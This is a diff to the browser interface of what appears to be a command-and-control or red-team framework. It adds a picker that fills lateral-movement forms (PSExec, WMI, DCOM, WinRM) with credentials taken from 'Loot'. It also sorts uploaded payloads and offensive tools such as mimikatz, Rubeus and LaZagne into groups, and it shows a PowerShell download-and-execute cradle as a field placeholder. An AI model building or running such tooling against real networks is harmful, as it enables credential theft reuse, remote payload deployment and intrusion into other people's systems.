@@ -297,6 +297,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 #ctx-quick-form .qf-btns button{flex:1;padding:5px;border:none;border-radius:4px;font-size:11px;cursor:pointer;font-family:var(--font-mono)}
 #ctx-quick-form .qf-go{background:var(--accent);color:#000;font-weight:700}
 #ctx-quick-form .qf-cancel{background:var(--bg2);border:1px solid var(--border);color:var(--text2)}
+#ctx-quick-form .qf-cred-pick{border-top:1px solid var(--border);padding-top:7px;margin-top:2px}
 /* ── Process table (inside console) ── */
 .ps-table{width:100%;border-collapse:collapse;font-size:11px;font-family:var(--font-mono);margin:2px 0}
 .ps-table th{padding:3px 8px;text-align:left;font-size:10px;color:var(--text3);text-transform:uppercase;border-bottom:1px solid var(--border);background:var(--bg3)}
@@ -2286,13 +2287,39 @@ function hideCtxMenu() {
 }
 
 // ── Quick floating form (lateral movement, privesc) ───────────────────────────
+function qfFillCred(credId) {
+  if (!credId) return;
+  const c = (window.creds||[]).find(x => String(x.id) === String(credId));
+  if (!c) return;
+  const uField = document.getElementById('qf_user');
+  const pField = document.getElementById('qf_pass');
+  if (uField) uField.value = c.domain ? `${c.domain}\\${c.username}` : (c.username||'');
+  if (pField) pField.value = c.secret||'';
+}
+
 function showQuickForm(title, fields, onSubmit) {
   const f = document.getElementById('ctx-quick-form');
   let html = `<h4>${esc(title)}</h4>`;
   fields.forEach(fd => {
-    html += `<div class="qf-row"><label>${esc(fd.label)}</label>`;
+    const rowCls = fd.type === 'cred-pick' ? 'qf-row qf-cred-pick' : 'qf-row';
+    html += `<div class="${rowCls}"><label>${esc(fd.label)}</label>`;
     if (fd.type === 'select') {
       html += `<select id="qf_${fd.key}">${fd.options.map(o=>`<option value="${esc(o.v)}">${esc(o.l)}</option>`).join('')}</select>`;
+    } else if (fd.type === 'select-grouped') {
+      const grpHtml = fd.groups.map(g => {
+        if (!g.items.length) return '';
+        const opts = g.items.map(o=>`<option value="${esc(o.v)}">${esc(o.l)}</option>`).join('');
+        return `<optgroup label="${esc(g.label)}">${opts}</optgroup>`;
+      }).join('');
+      html += `<select id="qf_${fd.key}"><option value="">— select —</option>${grpHtml}</select>`;
+    } else if (fd.type === 'cred-pick') {
+      const credOpts = (window.creds||[])
+        .filter(c => c.secret && !_isNTLMHash(c.secret||''))
+        .map(c => {
+          const label = (c.domain ? `${c.domain}\\` : '') + c.username;
+          return `<option value="${c.id}">${esc(label)}</option>`;
+        }).join('');
+      html += `<select id="qf_${fd.key}" onchange="qfFillCred(this.value)"><option value="">— pick from Loot —</option>${credOpts}</select>`;
     } else {
       html += `<input id="qf_${fd.key}" type="${fd.type||'text'}" value="${esc(fd.def||'')}" placeholder="${esc(fd.ph||'')}">`;
     }
@@ -2305,7 +2332,10 @@ function showQuickForm(title, fields, onSubmit) {
   f.innerHTML = html;
   f._submit = () => {
     const vals = {};
-    fields.forEach(fd => { vals[fd.key] = document.getElementById('qf_'+fd.key)?.value||''; });
+    fields.forEach(fd => {
+      if (fd.type === 'cred-pick') return;
+      vals[fd.key] = document.getElementById('qf_'+fd.key)?.value||'';
+    });
     closeQuickForm();
     onSubmit(vals);
   };
@@ -2464,18 +2494,21 @@ async function runCtxAction(act) {
       const agnt = agents.find(x => x.id === aid);
       const method = act.method;
       const labels = {psexec:'PSExec',wmi:'WMI',dcom:'DCOM',atexec:'AtExec',smbexec:'SMBExec',ssh:'SSH','winrm-exec':'WinRM Exec','winrm-deploy':'WinRM Deploy'};
-      // Get uploaded .exe files for payload dropdown
       const uploadR = await api('GET', '/api/uploads');
-      const exeFiles = (uploadR?.ok ? uploadR.data||[] : [])
-        .filter(f => f.filename?.match(/\.(exe|bin|ps1)$/i) && !f.agent_id)
-        .map(f => ({v: f.filename, l: f.filename}));
-      exeFiles.unshift({v:'', l:'— select payload —'});
+      const allFiles = (uploadR?.ok ? uploadR.data||[] : []).filter(f => f.filename?.match(/\.(exe|bin)$/i) && !f.agent_id);
+      const TOOL_RE = /^(rubeus|seatbelt|sharp|mimikatz|lazagne|winpeas|linpeas|certify|kekeo|accesschk|powercat|inveigh|responder|pingcastle|bloodhound|snaffler|kerbrute|adcs|adrecon|grouper|petitpotam|rottenpotato|juicypotato|printspoofer|sweetpotato|godpotato|spoolsample|chisel|ligolo|crackmapexec|impacket)/i;
+      const payloadGroup = allFiles.filter(f => !TOOL_RE.test(f.filename) || f.filename.match(/\.bin$/i)).map(f=>({v:f.filename,l:f.filename}));
+      const toolGroup    = allFiles.filter(f =>  TOOL_RE.test(f.filename) && !f.filename.match(/\.bin$/i)).map(f=>({v:f.filename,l:f.filename}));
 
       const isWinRM = method.startsWith('winrm');
-      const baseFields = [
-        {key:'host', label:'Target host / IP', def: agnt?.ip||'', ph:'10.10.10.x'},
+      const credFields = [
+        {key:'_cred', label:'Loot credentials', type:'cred-pick'},
         {key:'user', label:'Username', def:'', ph:'DOMAIN\\user'},
         {key:'pass', label:'Password', type:'password', ph:''},
+      ];
+      const baseFields = [
+        {key:'host', label:'Target host / IP', def: agnt?.ip||'', ph:'10.10.10.x'},
+        ...credFields,
       ];
       let extraFields = [];
       if (method === 'winrm-exec') {
@@ -2483,7 +2516,10 @@ async function runCtxAction(act) {
       } else if (method === 'winrm-deploy') {
         extraFields = [{key:'cradle', label:'PowerShell cradle', ph:'IEX(New-Object Net.WebClient).DownloadString(...)'}];
       } else {
-        extraFields = [{key:'payload', label:'Payload (.exe)', type:'select', options: exeFiles}];
+        extraFields = [{key:'payload', label:'Payload', type:'select-grouped', groups:[
+          {label:'🎯 Agent Payloads', items: payloadGroup},
+          {label:'🔧 .NET Tools',     items: toolGroup},
+        ]}];
       }
 
       showQuickForm(`⚡ ${labels[method]||method}`, [...baseFields, ...extraFields], vals => {
